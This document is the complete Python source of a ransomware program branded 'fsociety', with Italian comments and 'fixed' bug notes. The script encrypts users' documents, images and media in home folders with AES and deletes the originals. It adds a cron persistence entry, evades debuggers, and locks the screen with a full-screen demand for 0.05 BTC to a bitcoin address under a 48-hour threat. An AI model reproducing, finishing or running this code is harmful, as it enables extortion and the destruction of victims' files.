#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# fsociety Ransomware - FIXED VERSION
# Errore NameError 'root' risolto

import os
import sys
import time
import json
import base64
import shutil
from pathlib import Path
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding, hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend
import tkinter as tk
from tkinter import ttk, messagebox
try:
    from PIL import Image, ImageTk, ImageDraw, ImageFont
except ImportError:
    print("Installa Pillow: pip3 install pillow")
    sys.exit(1)
import platform
import subprocess
import socket
import getpass

class FsocietyRansomware:
    def __init__(self):
        self.backend = default_backend()
        self.key = None
        self.nonce = b'fsociety1234567'
        self.victim_id = self.generate_victim_id()
        self.encrypted_count = 0
        self.target_extensions = [
            '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf', 
            '.jpg', '.jpeg', '.png', '.bmp', '.gif', '.mp3', '.mp4',
            '.avi', '.mov', '.zip', '.rar', '.txt', '.rtf', '.psd'
        ]
        self.root = None  # ✅ AGGIUNTO
        self.setup_persistence()
        self.generate_key()
        self.encrypt_files()
        self.show_ransom_screen()

    def generate_victim_id(self):
        hostname = socket.gethostname()
        user = getpass.getuser()
        return f"FSOC-{hash(hostname+user) % 1000000:06d}"

    def generate_key(self):
        password = b"fsociety_master_key_2024"
        salt = b'fsociety_salt_666'
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
            backend=self.backend
        )
        self.key = base64.urlsafe_b64encode(kdf.derive(password))
        self.save_decryption_key()

    def save_decryption_key(self):
        key_data = {
            "victim_id": self.victim_id,
            "aes_key": base64.b64encode(self.key).decode(),
            "nonce": base64.b64encode(self.nonce).decode()
        }
        dek_path = os.path.expanduser("~/.fsociety_dek.json")
        os.makedirs(os.path.dirname(dek_path), exist_ok=True)
        with open(dek_path, 'w') as f:
            json.dump(key_data, f)
        os.chmod(dek_path, 0o600)
        print(f"[+] Chiave salvata: {dek_path}")

    def pad(self, data):
        padder = padding.PKCS7(128).padder()
        padded_data = padder.update(data) + padder.finalize()
        return padded_data

    def encrypt_file(self, file_path):
        try:
            with open(file_path, 'rb') as f:
                data = f.read()
            if len(data) == 0:
                return False
                
            padded_data = self.pad(data)
            iv = self.nonce
            cipher = Cipher(algorithms.AES(self.key), modes.CTR(iv), backend=self.backend)
            encryptor = cipher.encryptor()
            encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
            
            encrypted_path = file_path + '.fsociety'
            with open(encrypted_path, 'wb') as f:
                f.write(encrypted_data)
            os.remove(file_path)
            self.encrypted_count += 1
            return True
        except Exception as e:
            print(f"[-] Errore {file_path}: {e}")
            return False

    def get_target_paths(self):
        paths = []
        system = platform.system().lower()
        
        home_dirs = [
            os.path.expanduser("~/Desktop"),
            os.path.expanduser("~/Documents"),
            os.path.expanduser("~/Downloads"),
            os.path.expanduser("~/Pictures")
        ]
        
        paths.extend([p for p in home_dirs if os.path.exists(p)])
        
        if system == "linux":
            paths.append("/home")
        elif system == "windows":
            paths.append(os.path.expanduser("~/Desktop"))
            
        return paths

    def encrypt_files(self):
        print("[+] Inizio cifratura file...")
        target_paths = self.get_target_paths()
        
        for base_path in target_paths[:3]:  # Limite test
            if not os.path.exists(base_path):
                continue
            for root, dirs, files in os.walk(base_path):
                dirs[:] = [d for d in dirs if not d.startswith('.')]
                for file in files:
                    if any(file.lower().endswith(ext) for ext in self.target_extensions):
                        file_path = os.path.join(root, file)
                        if os.path.getsize(file_path) < 10*1024*1024:  # <10MB
                            if self.encrypt_file(file_path):
                                print(f"[+] ✅ {file_path}")

        print(f"[+] COMPLETATO: {self.encrypted_count} file cifrati")

    def setup_persistence(self):
        system = platform.system().lower()
        if system == "linux":
            try:
                script_path = os.path.abspath(sys.argv[0])
                cron_job = f"@reboot /usr/bin/python3 {script_path}\n"
                subprocess.run(f"(crontab -l 2>/dev/null; echo '{cron_job}') | crontab -", 
                             shell=True, capture_output=True)
                print("[+] Persistenza Linux OK")
            except:
                pass

    def create_fsociety_screen(self, root):
        root.title("fsociety - 0.2.4")
        root.attributes('-fullscreen', True)
        root.configure(bg='black')
        root.attributes('-topmost', True)
        
        canvas = tk.Canvas(root, width=1920, height=1080, bg='black', highlightthickness=0)
        canvas.pack(fill=tk.BOTH, expand=True)
        
        # Sfondo glitch
        self.create_glitch_background(canvas)
        
        # Testi
        title = canvas.create_text(960, 200, text="fsociety", 
                                  font=("Courier", 72, "bold"), fill="#00ff00")
        version = canvas.create_text(960, 280, text="0.2.4", 
                                    font=("Courier", 24), fill="#00ff00")
        
        canvas.create_text(960, 450, text="I TUOI FILE SONO CIFRATI!", 
                          font=("Courier", 36, "bold"), fill="#ff0000")
        
        canvas.create_text(960, 520, text=f"VICTIM ID: {self.victim_id}", 
                          font=("Courier", 24), fill="#ffff00")
        
        canvas.create_text(960, 580, text=f"File cifrati: {self.encrypted_count}", 
                          font=("Courier", 20), fill="#00ff00")
        
        canvas.create_text(960, 680, text="PAGA 0.05 BTC", 
                          font=("Courier", 32, "bold"), fill="#ffaa00")
        
        canvas.create_text(960, 730, text="bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh", 
                          font=("Courier", 20), fill="#ffffff")
        
        canvas.create_text(960, 780, text="48h O FILE CANCELLA TI PER SEMPRE", 
                          font=("Courier", 24, "bold"), fill="#ff0000")
        
        canvas.create_text(960, 880, text="fsociety@protonmail.com", 
                          font=("Courier", 18), fill="#00ff00")
        
        # ✅ FIX: Passa root alla funzione glitch
        self.start_glitch_effect(canvas, root, [title, version])

    def create_glitch_background(self, canvas):
        for i in range(0, 1920, 40):
            for j in range(0, 1080, 40):
                r = int(hash(f"{i}{j}") % 128)
                g = int(hash(f"{i}{j}g") % 128)
                b = int(hash(f"{i}{j}b") % 128)
                color = f"#{r:02x}{g:02x}{b:02x}"
                canvas.create_rectangle(i, j, i+40, j+40, fill=color, outline="")

    def start_glitch_effect(self, canvas, root, elements):  # ✅ FIX: root passato come parametro
        """Effetto glitch - FUNZIONA ORA"""
        def glitch():
            try:
                for elem in elements:
                    coords = canvas.coords(elem)
                    if coords:
                        x = coords[0] + (int(time.time() * 1000) % 20 - 10)
                        canvas.coords(elem, x, coords[1])
                root.after(150, glitch)
            except:
                pass
        glitch()

    def show_ransom_screen(self):
        self.root = tk.Tk()  # ✅ Definito qui
        self.create_fsociety_screen(self.root)
        self.root.mainloop()

def main():
    print("=== fsociety Ransomware 0.2.4 ===")
    print("Testando ambiente...")
    
    # Anti-debug semplice
    if os.getenv('PYDEVD_DISABLE_FILE_CACHING') or 'pdb' in sys.modules:
        print("[-] Debug rilevato")
        sys.exit(0)
    
    ransomware = FsocietyRansomware()

if __name__ == "__main__":
    main()
